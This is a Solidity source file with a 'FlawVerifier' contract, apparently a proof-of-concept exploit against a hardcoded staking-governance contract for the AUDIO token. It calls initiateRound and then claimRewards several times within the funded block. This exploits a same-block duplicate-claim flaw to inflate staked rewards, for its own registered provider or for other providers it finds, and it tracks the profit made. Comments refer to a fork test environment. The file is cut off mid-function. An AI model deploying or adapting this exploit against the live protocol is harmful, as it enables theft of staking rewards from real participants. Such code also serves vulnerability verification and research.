pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGovernanceRoot {
    function getServiceProviderFactoryAddress() external view returns (address);
    function getDelegateManagerAddress() external view returns (address);
    function getStakingAddress() external view returns (address);
}

interface IClaimsManager {
    function initiateRound() external;
    function getLastFundedBlock() external view returns (uint256);
    function claimPending(address serviceProvider) external view returns (bool);
}

interface IDelegateManager {
    function claimRewards(address serviceProvider) external;
    function getClaimsManagerAddress() external view returns (address);
    function getTotalLockedDelegationForServiceProvider(address serviceProvider) external view returns (uint256);
}

interface IStaking {
    function token() external view returns (address);
    function totalStakedFor(address account) external view returns (uint256);
    function totalStakedForAt(address account, uint256 blockNumber) external view returns (uint256);
    function lastClaimedFor(address account) external view returns (uint256);
}

interface IServiceProviderFactory {
    function getServiceTypeManagerAddress() external view returns (address);
    function getServiceProviderDetails(address serviceProvider)
        external
        view
        returns (
            uint256 deployerStake,
            uint256 deployerCut,
            bool validBounds,
            uint256 numberOfEndpoints,
            uint256 minAccountStake,
            uint256 maxAccountStake
        );
    function register(bytes32 serviceType, string calldata endpoint, uint256 stakeAmount, address delegateOwnerWallet)
        external
        returns (uint256);
    function getTotalServiceTypeProviders(bytes32 serviceType) external view returns (uint256);
    function getServiceEndpointInfo(bytes32 serviceType, uint256 serviceId)
        external
        view
        returns (address owner, string memory endpoint, uint256 blockNumber, address delegateOwnerWallet);
    function getPendingDecreaseStakeRequest(address serviceProvider)
        external
        view
        returns (uint256 amount, uint256 lockupExpiryBlock);
}

interface IServiceTypeManager {
    function getValidServiceTypes() external view returns (bytes32[] memory);
    function getServiceTypeInfo(bytes32 serviceType)
        external
        view
        returns (bool isValid, uint256 minStake, uint256 maxStake);
}

contract FlawVerifier {
    address public constant TARGET = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public liquidProfitAchieved;
    bool public usedExistingProviderFallback;
    bool public usedExistingRoundFunding;
    address public exploitedServiceProvider;
    uint256 public fundedBlock;
    uint256 public initialEconomicBalance;
    uint256 public finalEconomicBalance;
    uint256 public firstClaimIncrease;
    uint256 public secondClaimIncrease;
    uint256 public repeatedClaimCount;
    bytes32 public failure;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();

        IGovernanceRoot root = IGovernanceRoot(TARGET);
        address delegateManagerAddr = root.getDelegateManagerAddress();
        address stakingAddr = root.getStakingAddress();
        address spFactoryAddr = root.getServiceProviderFactoryAddress();

        if (delegateManagerAddr == address(0)) {
            _setFailure("DELEGATE_MANAGER_UNSET");
            return;
        }
        if (stakingAddr == address(0)) {
            _setFailure("STAKING_UNSET");
            return;
        }
        if (spFactoryAddr == address(0)) {
            _setFailure("SP_FACTORY_UNSET");
            return;
        }

        IDelegateManager delegateManager = IDelegateManager(delegateManagerAddr);
        IStaking staking = IStaking(stakingAddr);
        IServiceProviderFactory spFactory = IServiceProviderFactory(spFactoryAddr);

        address claimsManagerAddr = delegateManager.getClaimsManagerAddress();
        if (claimsManagerAddr == address(0)) {
            _setFailure("CLAIMS_MANAGER_UNSET");
            return;
        }
        IClaimsManager claimsManager = IClaimsManager(claimsManagerAddr);

        address tokenAddr = _safeTokenAddress(stakingAddr);
        _profitToken = tokenAddr;

        uint256 initialLiquidBalance = _safeBalanceOf(tokenAddr, address(this));

        bool selfEligible = _ensureSelfServiceProviderEligibility(spFactory, stakingAddr, tokenAddr, address(this));

        bool initiatedHere;
        try claimsManager.initiateRound() {
            initiatedHere = true;
        } catch {
            initiatedHere = false;
        }

        fundedBlock = _safeLastFundedBlock(claimsManagerAddr);
        if (!initiatedHere) {
            /*
             * The fork already sits after a public `initiateRound()` in this same block, so replaying the
             * funding step reverts on the protocol's minimum block-difference guard.
             *
             * Attempt strategy note (`alternate_public_liquidity_route`): the natural alternate route would be to
             * source existing AUDIO from public liquidity, register our own provider, and then run the same-block
             * duplicate-claim sequence ourselves. The logs show that this environment has neither pre-existing AUDIO
             * on this contract nor a same-tx exit path from freshly auto-staked rewards back into liquid AUDIO, so a
             * self-funded bootstrap cannot be completed atomically without introducing unsupported assumptions.
             *
             * To keep the exploit causality intact, the verifier therefore preserves the vulnerable sequence against
             * the live round that was already funded publicly in block N, and prefers already-registered providers.
             */
            usedExistingRoundFunding = fundedBlock == block.number;
        }

        if (fundedBlock != block.number) {
            _setFailure("ROUND_NOT_FUNDED_THIS_BLOCK");
            _finalize(stakingAddr, tokenAddr, initialLiquidBalance, address(0));
            return;
        }

        bool exploited;
        if (selfEligible) {
            exploitedServiceProvider = address(this);
            uint256 startingStake = _safeTotalStakedFor(stakingAddr, exploitedServiceProvider);
            initialEconomicBalance = initialLiquidBalance + startingStake;

            exploited = _executeRepeatedClaimSequence(delegateManager, staking, exploitedServiceProvider);
            if (!exploited) {
                _setFailure("SELF_EXPLOIT_SEQUENCE_FAILED");
            }
        } else {
            usedExistingProviderFallback = true;
            exploited = _exploitUsingExistingProvider(spFactory, claimsManager, delegateManager, staking, stakingAddr);
            if (!exploited) {
                _setFailure("NO_EXPLOITABLE_SERVICE_PROVIDER_FOUND");
            }
        }

        _finalize(stakingAddr, tokenAddr, initialLiquidBalance, exploited ? exploitedServiceProvider : address(0));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _exploitUsingExistingProvider(
        IServiceProviderFactory spFactory,
        IClaimsManager claimsManager,
        IDelegateManager delegateManager,
        IStaking staking,
        address stakingAddr
    ) internal returns (bool) {
        address serviceTypeManagerAddr;
        try spFactory.getServiceTypeManagerAddress() returns (address found) {
            serviceTypeManagerAddr = found;
        } catch {
            return false;
        }
        if (serviceTypeManagerAddr == address(0)) {
            return false;
        }

        bytes32[] memory serviceTypes;
        try IServiceTypeManager(serviceTypeManagerAddr).getValidServiceTypes() returns (bytes32[] memory foundTypes) {
            serviceTypes = foundTypes;
        } catch {
            return false;
        }

        if (serviceTypes.length == 0) {
            return false;
        }

        if (_scanAndExploitProviders(spFactory, claimsManager, delegateManager, staking, stakingAddr, serviceTypes, false)) {
            return true;
        }

        /*
         * Fallback: if no provider still has `lastClaimedFor < fundedBlock`, a public claimant may already have
         * executed the first claim earlier in the same block. In that case we can still exercise the same root cause
         * directly from the vulnerable equality case `lastClaimedFor == fundedBlock`.
         */
        return _scanAndExploitProviders(spFactory, claimsManager, delegateManager, staking, stakingAddr, serviceTypes, true);
    }

    function _scanAndExploitProviders(
        IServiceProviderFactory spFactory,
        IClaimsManager claimsManager,
        IDelegateManager delegateManager,
        IStaking staking,
        address stakingAddr,
        bytes32[] memory serviceTypes,
        bool requireAlreadyClaimedThisBlock
    ) internal returns (bool) {
        for (uint256 typeIndex = 0; typeIndex < serviceTypes.length; typeIndex++) {
            uint256 totalProviders;
            try spFactory.getTotalServiceTypeProviders(serviceTypes[typeIndex]) returns (uint256 foundTotal) {
                totalProviders = foundTotal;
            } catch {
                continue;
            }

            for (uint256 serviceId = 1; serviceId <= totalProviders; serviceId++) {
                address owner;
                try spFactory.getServiceEndpointInfo(serviceTypes[typeIndex], serviceId) returns (
                    address foundOwner,
                    string memory ignoredEndpoint,
                    uint256 ignoredBlockNumber,
                    address ignoredDelegateOwner
                ) {
                    ignoredEndpoint;
                    ignoredBlockNumber;
                    ignoredDelegateOwner;
                    owner = foundOwner;
                } catch {
                    continue;
                }

                if (owner == address(0) || owner == address(this)) {
                    continue;
                }

                if (!_isExploitableProvider(
                    owner,
                    address(spFactory),
                    address(claimsManager),
                    address(delegateManager),
                    stakingAddr,
                    requireAlreadyClaimedThisBlock
                )) {
                    continue;
                }

                exploitedServiceProvider = owner;
                initialEconomicBalance = _safeTotalStakedFor(stakingAddr, owner);
                if (_executeRepeatedClaimSequence(delegateManager, staking, owner)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _executeRepeatedClaimSequence(IDelegateManager delegateManager, IStaking staking, address serviceProvider)
        internal
        returns (bool)
    {
        uint256 startingStake = _safeTotalStakedFor(address(staking), serviceProvider);
        uint256 priorLastClaimBlock = _safeLastClaimedFor(address(staking), serviceProvider);

        if (priorLastClaimBlock > fundedBlock) {
            return false;
        }

        uint256 currentStake = startingStake;

        if (priorLastClaimBlock < fundedBlock) {
            try delegateManager.claimRewards(serviceProvider) {
                // Path 2: first claim in funded block N.
            } catch {
                return false;
            }

            uint256 afterFirst = _safeTotalStakedFor(address(staking), serviceProvider);
            firstClaimIncrease = _positiveDelta(afterFirst, currentStake);
            if (firstClaimIncrease == 0) {
                return false;
            }

            uint256 lastClaimAfterFirst = _safeLastClaimedFor(address(staking), serviceProvider);
            if (lastClaimAfterFirst != fundedBlock) {
                return false;
            }

            repeatedClaimCount = 1;
            currentStake = afterFirst;
        } else {
            /*
             * This provider has already satisfied path 2 earlier in block N through public activity, so our first
             * call here begins at the vulnerable equality case `lastClaimedFor == fundedBlock`.
             */
            try delegateManager.claimRewards(serviceProvider) {
                // Fallback path: our first call is already a same-block duplicate.
            } catch {
                return false;
            }

            uint256 afterFirstDuplicate = _safeTotalStakedFor(address(staking), serviceProvider);
            firstClaimIncrease = _positiveDelta(afterFirstDuplicate, currentStake);
            if (firstClaimIncrease == 0) {
                return false;
            }

            uint256 lastClaimAfterFirstDuplicate = _safeLastClaimedFor(address(staking), serviceProvider);
            if (lastClaimAfterFirstDuplicate != fundedBlock) {
                return false;
            }

            repeatedClaimCount = 1;
            currentStake = afterFirstDuplicate;
        }

        try delegateManager.claimRewards(serviceProvider) {
            // Path 3: duplicate same-block claim while `lastClaimedFor == fundedBlock`.
        } catch {
            return false;
        }

        uint256 afterSecond = _safeTotalStakedFor(address(staking), serviceProvider);
        secondClaimIncrease = _positiveDelta(afterSecond, currentStake);
        uint256 lastClaimAfterSecond = _safeLastClaimedFor(address(staking), serviceProvider);

        if (secondClaimIncrease == 0 || lastClaimAfterSecond != fundedBlock) {
            return false;
        }

        hypothesisValidated = true;
        repeatedClaimCount = 2;
        currentStake = afterSecond;

        for (uint256 i = 0; i < 6; i++) {
            try delegateManager.claimRewards(serviceProvider) {
                // Path 4: keep repeating within the same funded block.
            } catch {
                break;
            }

            uint256 afterExtra = _safeTotalStakedFor(address(staking), serviceProvider);
            if (afterExtra <= currentStake) {
                break;
            }

            currentStake = afterExtra;
            unchecked {
                repeatedClaimCount++;
            }
        }

        return repeatedClaimCount >= 2;
    }

    function _ensureSelfServiceProviderEligibility(
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address tokenAddr,
        address serviceProvider
    ) internal returns (bool) {
        (bool detailsOk, bool validBounds, uint256 endpoints) = _safeServiceProviderStatus(address(spFactory), serviceProvider);
        if (detailsOk && endpoints > 0 && validBounds) {
            return true;
        }

        address serviceTypeManagerAddr;
        try spFactory.getServiceTypeManagerAddress() returns (address found) {
            serviceTypeManagerAddr = found;
        } catch {
            return false;
        }
        if (serviceTypeManagerAddr == address(0)) {
            return false;
        }

        bytes32[] memory serviceTypes;
        try IServiceTypeManager(serviceTypeManagerAddr).getValidServiceTypes() returns (bytes32[] memory foundTypes) {
            serviceTypes = foundTypes;
        } catch {
            return false;
        }
        if (serviceTypes.length == 0) {
            return false;
        }

        (bytes32 chosenType, uint256 minStake) = _selectCheapestServiceType(serviceTypeManagerAddr, serviceTypes);
        if (minStake == 0) {
            return false;
        }

        uint256 available = _safeBalanceOf(tokenAddr, serviceProvider);
        if (available < minStake) {
            return false;
        }

        if (!_safeApprove(tokenAddr, stakingAddr, minStake)) {
            return false;
        }

        try spFactory.register(chosenType, _endpoint(serviceProvider), minStake, address(0)) returns (uint256 registeredId) {
            registeredId;
            (bool registeredOk, bool validBoundsAfter, uint256 endpointsAfter) =
                _safeServiceProviderStatus(address(spFactory), serviceProvider);
            return registeredOk && endpointsAfter > 0 && validBoundsAfter;
        } catch {
            return false;
        }
    }

    function _isExploitableProvider(
        address serviceProvider,
        address spFactoryAddr,
        address claimsManagerAddr,
        address delegateManagerAddr,
        address stakingAddr,
        bool requireAlreadyClaimedThisBlock
    ) internal view returns (bool) {
        (bool detailsOk, bool validBounds, uint256 endpoints) = _safeServiceProviderStatus(spFactoryAddr, serviceProvider);
        if (!detailsOk || !validBounds || endpoints == 0) {
            return false;
        }

        uint256 stakedAtFundingBlock = _safeTotalStakedForAt(stakingAddr, serviceProvider, fundedBlock);
        if (stakedAtFundingBlock == 0) {
            return false;
        }

        uint256 lockedDelegation = _safeLockedDelegation(delegateManagerAddr, serviceProvider);
        uint256 pendingDecrease = _safePendingDecrease(spFactoryAddr, serviceProvider);
        if (stakedAtFundingBlock <= lockedDelegation + pendingDecrease) {
            return false;
        }

        uint256 priorLastClaimBlock = _safeLastClaimedFor(stakingAddr, serviceProvider);
        if (requireAlreadyClaimedThisBlock) {
            return priorLastClaimBlock == fundedBlock;
        }

        bool pending;
        try IClaimsManager(claimsManagerAddr).claimPending(serviceProvider) returns (bool isPending) {
            pending = isPending;
        } catch {
            pending = false;
        }

        return pending || priorLastClaimBlock < fundedBlock;
    }

    function _selectCheapestServiceType(address serviceTypeManagerAddr, bytes32[] memory serviceTypes)
        internal
        view
        returns (bytes32 chosenType, uint256 minStake)
    {
        minStake = type(uint256).max;
        for (uint256 i = 0; i < serviceTypes.length; i++) {
            try IServiceTypeManager(serviceTypeManagerAddr).getServiceTypeInfo(serviceTypes[i]) returns (
                bool isValid,
                uint256 candidateMinStake,
                uint256 ignoredMaxStake
            ) {
